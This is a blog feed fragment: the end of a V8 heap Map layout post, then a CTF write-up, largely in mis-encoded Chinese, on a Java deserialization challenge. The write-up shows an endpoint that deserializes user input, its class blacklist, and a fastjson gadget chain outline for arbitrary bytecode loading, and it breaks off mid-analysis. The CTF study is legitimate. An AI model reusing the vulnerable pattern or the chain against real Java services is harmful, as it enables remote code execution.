class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// All heap objects have a Map that describes their structure.</span></span><br><span class="line"><span class="comment">//  A Map contains information about:</span></span><br><span class="line"><span class="comment">//  - Size information about the object</span></span><br><span class="line"><span class="comment">//  - How to iterate over an object (for garbage collection)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Map layout:</span></span><br><span class="line"><span class="comment">// +---------------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">// |   _ Type _    | _ Description _                             |</span></span><br><span class="line"><span class="comment">// +---------------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">// | TaggedPointer | map - Always a pointer to the MetaMap root  |</span></span><br><span class="line"><span class="comment">// +---------------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">// | Int           | The first int field                         |</span></span><br><span class="line"><span class="comment">//  `---+----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Byte     | [instance_size]                             |</span></span><br><span class="line"><span class="comment">//      +----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Byte     | If Map for a primitive type:                |</span></span><br><span class="line"><span class="comment">//      |          |   native context index for constructor fn   |</span></span><br><span class="line"><span class="comment">//      |          | If Map for an Object type:                  |</span></span><br><span class="line"><span class="comment">//      |          |   inobject properties start offset in words |</span></span><br><span class="line"><span class="comment">//      +----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Byte     | [used_or_unused_instance_size_in_words]     |</span></span><br><span class="line"><span class="comment">//      |          | For JSObject in fast mode this byte encodes |</span></span><br><span class="line"><span class="comment">//      |          | the size of the object that includes only   |</span></span><br><span class="line"><span class="comment">//      |          | the used property fields or the slack size  |</span></span><br><span class="line"><span class="comment">//      |          | in properties backing store.                |</span></span><br><span class="line"><span class="comment">//      +----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Byte     | [visitor_id]                                |</span></span><br><span class="line"><span class="comment">// +----+----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">// | Int           | The second int field                        |ğŸŒŸ</span></span><br><span class="line"><span class="comment">//  `---+----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Short    | [instance_type]                             |</span></span><br><span class="line"><span class="comment">//      +----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Byte     | [bit_field]                                 |</span></span><br><span class="line"><span class="comment">//      |          |   - has_non_instance_prototype (bit 0)      |</span></span><br><span class="line"><span class="comment">//      |          |   - is_callable (bit 1)                     |</span></span><br><span class="line"><span class="comment">//      |          |   - has_named_interceptor (bit 2)           |</span></span><br><span class="line"><span class="comment">//      |          |   - has_indexed_interceptor (bit 3)         |</span></span><br><span class="line"><span class="comment">//      |          |   - is_undetectable (bit 4)                 |</span></span><br><span class="line"><span class="comment">//      |          |   - is_access_check_needed (bit 5)          |</span></span><br><span class="line"><span class="comment">//      |          |   - is_constructor (bit 6)                  |</span></span><br><span class="line"><span class="comment">//      |          |   - has_prototype_slot (bit 7)              |</span></span><br><span class="line"><span class="comment">//      +----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Byte     | [bit_field2]                                |</span></span><br><span class="line"><span class="comment">//      |          |   - is_extensible (bit 0)                   |</span></span><br><span class="line"><span class="comment">//      |          |   - is_prototype_map (bit 1)                |</span></span><br><span class="line"><span class="comment">//      |          |   - is_in_retained_map_list (bit 2)         |</span></span><br><span class="line"><span class="comment">//      |          |   - elements_kind (bits 3..7)               |</span></span><br><span class="line"><span class="comment">// +----+----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">// | Int           | [bit_field3]                                |</span></span><br><span class="line"><span class="comment">// |               |   - enum_length (bit 0..9)                  |</span></span><br><span class="line"><span class="comment">// |               |   - number_of_own_descriptors (bit 10..19)  |</span></span><br><span class="line"><span class="comment">// |               |   - is_dictionary_map (bit 20)              |</span></span><br><span class="line"><span class="comment">// |               |   - owns_descriptors (bit 21)               |</span></span><br><span class="line"><span class="comment">// |               |   - has_hidden_prototype (bit 22)           |</span></span><br><span class="line"><span class="comment">// |               |   - is_deprecated (bit 23)                  |</span></span><br><span class="line"><span class="comment">// |               |   - is_unstable (bit 24)                    |</span></span><br><span class="line"><span class="comment">// |               |   - is_migration_target (bit 25)            |</span></span><br><span class="line"><span class="comment">// |               |   - is_immutable_proto (bit 26)             |</span></span><br><span class="line"><span class="comment">// |               |   - new_target_is_base (bit 27)             |</span></span><br><span class="line"><span class="comment">// |               |   - may_have_interesting_symbols (bit 28)   |</span></span><br><span class="line"><span class="comment">// |               |   - construction_counter (bit 29..31)       |</span></span><br><span class="line"><span class="comment">// |               |                                             |</span></span><br><span class="line"><span class="comment">// +*************************************************************+</span></span><br><span class="line"><span class="comment">// | Int           | On systems with 64bit pointer types, there  |</span></span><br><span class="line"><span class="comment">// |               | is an unused 32bits after bit_field3        |</span></span><br><span class="line"><span class="comment">// +*************************************************************+</span></span><br><span class="line"><span class="comment">// | TaggedPointer | [prototype]                                 |</span></span><br><span class="line"><span class="comment">// +---------------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">// | TaggedPointer | [constructor_or_backpointer]                |</span></span><br><span class="line"><span class="comment">// +---------------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">// | TaggedPointer | If Map is a prototype map:                  |</span></span><br><span class="line"><span class="comment">// |               |   [prototype_info]                          |</span></span><br><span class="line"><span class="comment">// |               | Else:                                       |</span></span><br><span class="line"><span class="comment">// |               |   [raw_transitions]                         |</span></span><br><span class="line"><span class="comment">// +---------------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">// | TaggedPointer | [instance_descriptors]                      |</span></span><br><span class="line"><span class="comment">// +*************************************************************+</span></span><br><span class="line"><span class="comment">// ! TaggedPointer ! [layout_descriptors]                        !</span></span><br><span class="line"><span class="comment">// !               ! Field is only present if compile-time flag  !</span></span><br><span class="line"><span class="comment">// !               ! FLAG_unbox_double_fields is enabled         !</span></span><br><span class="line"><span class="comment">// !               ! (basically on 64 bit architectures)         !</span></span><br><span class="line"><span class="comment">// +*************************************************************+</span></span><br><span class="line"><span class="comment">// | TaggedPointer | [dependent_code]                            |</span></span><br><span class="line"><span class="comment">// +---------------+---------------------------------------------+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js-engine </tag>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>entry_java-å‡ºé¢˜è®°å½•/wp</title>
      <link href="/2023/11/02/entry-java-%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95-wp/"/>
      <url>/2023/11/02/entry-java-%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-åºè¨€"><a href="#0x00-åºè¨€" class="headerlink" title="0x00 åºè¨€"></a>0x00 åºè¨€</h2><p>æ ¡èµ›å‡ºçš„ä¸€é“javaçš„wpï¼Œè®°å½•ä¸€ä¸‹</p><h2 id="0x01-åˆ†æ"><a href="#0x01-åˆ†æ" class="headerlink" title="0x01 åˆ†æ"></a>0x01 åˆ†æ</h2><h3 id="controlleréƒ¨åˆ†"><a href="#controlleréƒ¨åˆ†" class="headerlink" title="controlleréƒ¨åˆ†"></a>controlleréƒ¨åˆ†</h3><p>æ€»å…±å°±ä¸¤ä¸ªï¼Œä¸€ä¸ªæ²¡ä»€ä¹ˆç”¨çš„æ¬¢è¿ç•Œé¢ï¼Œä»¥åŠä¸€ä¸ªæ¥å—base64ç¼–ç åçš„æ•°æ®å¹¶è¿›è¡Œè§£ç ååºåˆ—åŒ–çš„&#x2F;input</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/input&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">read</span><span class="params">(<span class="meta">@RequestParam</span> String data)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(data);</span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">secObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">secObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Something error.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Pass detection.&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>åŒ…è£¹è¾“å…¥æµçš„ObjectInputStreamç”¨çš„æ˜¯è‡ªå®šä¹‰çš„ï¼Œè·Ÿè¿›ä¸€ä¸‹,å‘ç°å†…ç½®äº†é»‘åå•</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] blacklist = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">           <span class="string">&quot;java\\.security.*&quot;</span>, <span class="string">&quot;java\\.rmi.*&quot;</span>,  <span class="string">&quot;com\\.fasterxml.*&quot;</span>, <span class="string">&quot;com\\.ctf\\.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;org\\.springframework.*&quot;</span>, <span class="string">&quot;com\\.sun\\.org\\.apache\\.xalan\\.*&quot;</span>,<span class="string">&quot;org\\.yaml.*&quot;</span>,<span class="string">&quot;org\\.apache.logging.*&quot;</span>,<span class="string">&quot;org\\.apache.tomcat.*&quot;</span>, <span class="string">&quot;javax\\.management\\.remote.*&quot;</span></span><br><span class="line">   &#125;;</span><br></pre></td></tr></table></figure></div><blockquote><p>é»‘åå•å¯ä»¥é€šè¿‡äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡ï¼Œä½†æ˜¯å¸¸ç”¨çš„ç±»å¦‚<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>å°±è¢«banäº†ï¼Œä»¥åŠ<code>java.security</code>ä¸‹çš„ç»å…¸SignedObjectä¹Ÿè¢«é™åˆ¶,ç›´æ¥ç¡¬æ‰“äºŒæ¬¡ååºåˆ—åŒ–ä¼šæ¯”è¾ƒå›°éš¾</p></blockquote><p>å†è§‚å¯Ÿä¸€ä¸‹secObjectInputStreamï¼Œå…¶ç»§æ‰¿ ObjectInputStream å¹¶é‡å†™äº† resolveClass() æ–¹æ³•ï¼Œè€Œé»‘åå•çš„æ£€æµ‹å°±æ˜¯åœ¨resolveClassæ–¹æ³•ä¸­è°ƒç”¨contiansæ–¹æ³•è¿›è¡Œçš„</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass cls)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">   <span class="keyword">if</span>(!contains(cls.getName())) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(cls);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;You can&#x27;t use class&quot;</span>, cls.getName());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(String targetValue)</span> &#123;</span><br><span class="line">   <span class="keyword">for</span> (String forbiddenPackage : blacklist) &#123;</span><br><span class="line">      <span class="keyword">if</span> (targetValue.matches(forbiddenPackage))</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å¹¶ä¸”è¿™é“é¢˜çš„ä¾èµ–æ˜¯1.2.83çš„fastjsonï¼Œéœ€è¦ç»“åˆé‡Œé¢JSONArrayæ¥ååºåˆ—åŒ–ï¼Œå¯ä»¥å¾ˆå®¹æ˜“æƒ³åˆ°ä¸€æ¡é“¾</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject -&gt;</span><br><span class="line">JSON.toString -&gt;</span><br><span class="line">JSON.toJSONString -&gt;</span><br><span class="line">TemplatesImpl.getOutputProperties <span class="comment">//åŠ è½½ä»»æ„å­—èŠ‚ç </span></span><br></pre></td></tr></table></figure></div><blockquote><p>ä½†æ˜¯æ–°ç‰ˆçš„fastjsonä¸­JSONArrayä»¥åŠJSONObjectçš„readObjectä¸­ç”¨<code>SecureObjectInputStream</code>ç±»é‡æ–°åŒ…è½¬äº†ä¸€ä¸‹è¾“å…¥æµï¼Œ<code>SecureObjectInputStream</code>ç±»å½“ä¸­é‡å†™äº†<code>resolveClass</code>,é€šè¿‡è°ƒç”¨<code>checkAutoType</code>æ–¹æ³•åšç±»çš„æ£€æŸ¥ï¼ŒTemplatesImplå°±åœ¨å…¶é»‘åå•ä¸­</p></blockquote><p>ç°åœ¨çš„æ€è·¯å¯ä»¥æ”¹ä¸ºå¦‚ä½•ç»•è¿‡resolveClass,é¦–å…ˆçœ‹ä¸€ä¸‹æ•´ä¸ªååºåˆ—åŒ–è¿‡ç¨‹ï¼Œçœ‹ä¸€ä¸‹resolveClassæ˜¯åœ¨å“ªé‡Œè¢«è°ƒç”¨çš„ï¼Œç”±äºè¿™é‡ŒsecObjectInputStreamç»§æ‰¿è‡ªObjectInputStreamï¼Œä¸”æ²¡æœ‰é‡å†™å…¶readObjectæ–¹æ³•ï¼Œå› æ­¤è·Ÿè¿›<code>java.io.ObjectInputStream#readObject</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">        <span class="keyword">public</span> String <span class="title function_">read</span><span class="params">(<span class="meta">@RequestParam</span> String data)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(data);</span><br><span class="line">                <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">                <span class="type">secObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">secObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">                objectInputStream.readObject();<span class="comment">//***</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Something error.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Pass detection.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//next -&gt;</span></span><br><span class="line"><span class="comment">//`java.io.ObjectInputStream#readObject`</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">readObject</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (enableOverride) &#123;</span><br><span class="line">            <span class="keyword">return</span> readObjectOverride();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// if nested read, passHandle contains handle of enclosing object</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">outerHandle</span> <span class="operator">=</span> passHandle;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> readObject0(<span class="literal">false</span>);<span class="comment">//**</span></span><br><span class="line">            handles.markDependency(outerHandle, passHandle);</span><br><span class="line">            <span class="type">ClassNotFoundException</span> <span class="variable">ex</span> <span class="operator">=</span> handles.lookupException(passHandle);</span><br><span class="line">            <span class="keyword">if</span> (ex != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> ex;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (depth == <span class="number">0</span>) &#123;</span><br><span class="line">                vlist.doCallbacks();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            passHandle = outerHandle;</span><br><span class="line">            <span class="keyword">if</span> (closed &amp;&amp; depth == <span class="number">0</span>) &#123;</span><br><span class="line">                clear();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>è·Ÿè¿›<code>java.io.ObjectInputStream#readObject0</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">readObject0</span><span class="params">(<span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">oldMode</span> <span class="operator">=</span> bin.getBlockDataMode();</span><br><span class="line">    <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">remain</span> <span class="operator">=</span> bin.currentBlockRemaining();</span><br><span class="line">        <span class="keyword">if</span> (remain &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(remain);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (defaultDataEnd) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Fix for 4360508: stream is currently at the end of a field</span></span><br><span class="line"><span class="comment">             * value block written via default serialization; since there</span></span><br><span class="line"><span class="comment">             * is no terminating TC_ENDBLOCKDATA tag, simulate</span></span><br><span class="line"><span class="comment">             * end-of-custom-data behavior explicitly.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        bin.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span> tc;</span><br><span class="line">    <span class="keyword">while</span> ((tc = bin.peekByte()) == TC_RESET) &#123;</span><br><span class="line">        bin.readByte();</span><br><span class="line">        handleReset();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    depth++;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (tc) &#123;<span class="comment">//ğŸŒŸğŸŒŸğŸŒŸ</span></span><br><span class="line">            <span class="keyword">case</span> TC_NULL:</span><br><span class="line">                <span class="keyword">return</span> readNull();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">                <span class="keyword">return</span> readHandle(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_CLASS:</span><br><span class="line">                <span class="keyword">return</span> readClass(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">            <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">                <span class="keyword">return</span> readClassDesc(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_STRING:</span><br><span class="line">            <span class="keyword">case</span> TC_LONGSTRING:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readString(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ARRAY:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readArray(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ENUM:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readEnum(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_OBJECT:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_EXCEPTION:</span><br><span class="line">                <span class="type">IOException</span> <span class="variable">ex</span> <span class="operator">=</span> readFatalException();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WriteAbortedException</span>(<span class="string">&quot;writing aborted&quot;</span>, ex);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATA:</span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATALONG:</span><br><span class="line">                <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                    bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">                    bin.peek();             <span class="comment">// force header read</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(</span><br><span class="line">                        bin.currentBlockRemaining());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                        <span class="string">&quot;unexpected block data&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ENDBLOCKDATA:</span><br><span class="line">                <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(<span class="literal">true</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                        <span class="string">&quot;unexpected end of block data&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                    String.format(<span class="string">&quot;invalid type code: %02X&quot;</span>, tc));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        depth--;</span><br><span class="line">        bin.setBlockDataMode(oldMode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>ä¼šæ ¹æ®è¯»åˆ°çš„bytesä¸­tcçš„æ•°æ®ç±»å‹åšä¸åŒçš„å¤„ç†å»æ¢å¤éƒ¨åˆ†å¯¹è±¡,caseé‡Œé¢çš„ä¸åŒåˆ†æ”¯è°ƒç”¨çš„æ–¹æ³•è·Ÿè¿›åˆ°åé¢éƒ½ä¼šå‘ç°è°ƒç”¨äº†<code>readClassDesc</code>å»è·å–ç±»çš„æè¿°ç¬¦,åªæœ‰</p></blockquote><p>è·Ÿè¿›<code>readClassDesc</code>æ–¹æ³•çœ‹ä¸€ä¸‹</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ObjectStreamClass <span class="title function_">readClassDesc</span><span class="params">(<span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span 